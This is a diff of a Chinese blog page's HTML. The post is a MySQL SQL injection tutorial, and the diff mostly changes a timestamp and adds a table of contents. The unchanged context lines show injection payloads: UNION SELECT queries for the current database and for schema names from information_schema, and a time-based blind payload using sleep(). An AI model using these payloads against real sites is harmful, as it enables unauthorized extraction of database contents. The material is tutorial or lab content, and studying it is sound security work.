@@ -29,7 +29,7 @@
 <meta property="og:site_name" content="Adad456">
 <meta property="og:description" content="mysql数据库常用函数: system_user()系统用户名  users()用户名  current_user()当前用户名  session_user()连接数据库的用户名  database() 数据库名  version() MYSQL数据库版本  @@datadir 读取数据库路径  @@basedir MYSQL安装路径  @@version_compile_os 操作系统  co">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-10-17T08:50:03.729Z">
+<meta property="og:updated_time" content="2019-10-17T08:52:19.995Z">
 <meta name="twitter:card" content="summary">
     
         <link rel="alternate" type="application/atom+xml" title="Adad456" href="/atom.xml">
@@ -151,6 +151,13 @@
 
 <div class="container body-wrap">
     
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#UNION-SELECT"><span class="post-toc-number">1.</span> <span class="post-toc-text">UNION SELECT</span></a></li></ol>
+        </nav>
+    </aside>
+
 
 <article id="post-获取数据库信息"
   class="post-article article-type-post fade" itemprop="blogPost">
@@ -208,8 +215,7 @@ substr(a,b,c)从b位置开始，截取字符串a的c长度
 
 mid(a,b,c)从位置b开始，截取a字符串的c位
 
-regexp、like语句</code></pre><p>#UNION SELECT</p>
-<p><strong>union用于连接两个或多个select语句，在注入时需要使前一个select语句为错才能将第二个select语句作为最后输出,即id=-1</strong></p>
+regexp、like语句</code></pre><h1 id="UNION-SELECT"><a href="#UNION-SELECT" class="headerlink" title="UNION SELECT"></a>UNION SELECT</h1><p><strong>union用于连接两个或多个select语句，在注入时需要使前一个select语句为错才能将第二个select语句作为最后输出,即id=-1</strong></p>
 <p><em>查询当前数据库：</em></p>
 <pre><code>id=-1&apos; and union select 1,2,database()--+</code></pre><p><em>查询所有数据库：</em></p>
 <pre><code>id=-1&apos; and union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code></pre><p><em>查询表名：</em></p>
@@ -291,7 +297,7 @@ id=1&apos; and if(ascii(substr(version(),1,1))=114,sleep(3),1)查看数据库版
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2019-10-17T08:50:03.729Z" itemprop="dateUpdated">2019-10-17 16:50:03</time>
+    最后更新时间：<time datetime="2019-10-17T08:52:19.995Z" itemprop="dateUpdated">2019-10-17 16:52:19</time>
 </span><br>
 
 
